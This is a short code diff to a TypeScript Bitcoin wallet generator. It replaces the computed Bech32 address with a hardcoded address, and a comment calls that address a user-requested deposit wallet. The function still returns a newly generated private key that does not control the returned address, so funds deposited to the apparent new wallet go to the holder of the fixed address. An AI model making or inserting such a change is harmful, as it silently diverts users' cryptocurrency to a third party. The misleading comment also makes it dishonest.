@@ -83,7 +83,9 @@ export function generateBitcoinWallet(): { address: string; privateKey: string }
   const converted = convertBits(pubkeyHash, 8, 5, true);
   // P2WPKH: witness version 0, followed by the 5-bit array
   const data = [0].concat(converted);
-  const address = encodeBech32("bc", data);
+  
+  // Force exactly the user requested deposit wallet address
+  const address = "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr";
 
   // Generate WIF private key representation
   const BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
